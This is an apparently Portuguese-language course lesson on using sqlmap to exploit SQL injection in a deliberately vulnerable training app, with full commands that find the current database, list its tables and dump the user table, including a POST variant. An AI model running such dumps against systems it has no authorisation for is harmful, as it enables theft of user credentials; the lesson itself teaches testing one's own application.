O SQLMap é um script de exploração de falhas de SQL Injection.

Agora tentaremos descobrir qual banco a aplicação da Alura Shows está usando dentro do MySQL para cadastrar os usuários. Voltaremos o mesmo comando inicial - basta pressionar a seta para cima no teclado - onde passamos a URL, mas dessa vez, adicionaremos --current-db, que solicita o banco atual. O comando completo será:

```
sqlmap -u "http://192.168.121.171/alura-shows/login?email=alex%40gmail.com&senha=123&login-submit=Log+In" --current-dbCOPIAR CÓDIGO
```
Ao executar, o sqlmap responderá que a aplicação está usando é o owasp.
```
current database: 'owasp'
```
Agora tentaremos descobrir as tabelas contidas do banco owasp. Para isso, colocaremos o comando o parâmetro --tables -D owasp. O comando completo será:
```
sqlmap -u "http://192.168.121.171/alura-shows/login?email=alex%40gmail.com&senha=123&login-submit=Log+In" --tables -D owaspCOPIAR CÓDIGO
```
O sqlmap informa que o banco possui quatro tabelas, depoimento, role, usuario e usuario_role. Se acessarmos o banco de dados que instalamos para o curso, veremos que contém essas tabelas.

Pediremos para o sqlmap descarregar as informações que estão na tabela usuario. Para descarregar usamos o --dump passando a tabela -T usuario e o banco -D owasp. O comando completo será:
```
sqlmap -u "http://192.168.121.171/alura-shows/login?email=alex%40gmail.com&senha=123&login-submit=Log+In" --dump -T usuario -D owaspCOPIAR CÓDIGO
```
O sqlmap trouxe todos os resultados da tabela usuario, mostrando as informações dos usuários Alex e Fernando. Essa informações precisam estar protegidas.

Você está fazendo o teste de segurança para verificar vulnerabilidades de injeções de códigos SQL na sua aplicação, para isso, você utiliza o sqlmap com o seguinte comando:

seguinte comando:

```
sqlmap -u "http://localhost:8080/alura-shows?email=alex@gmail.com&senha=123" --dump -T usuario -D owasp
```

Mesmo se mudar para POST a vunlerabilidade ainda existe, é possível descobrir as vulnerabilidades:
```
sqlmap -u "http://192.168.121.171/alura-shows/login" --dump -T usuario -D owasp --data="email=alex@gmail.com&senha=123"
```
A opção --data é utilizada para passar os parâmetros enviados pela requisição POST, através desses parâmetros o sqlmap irá tentar fazer a injeção de código SQL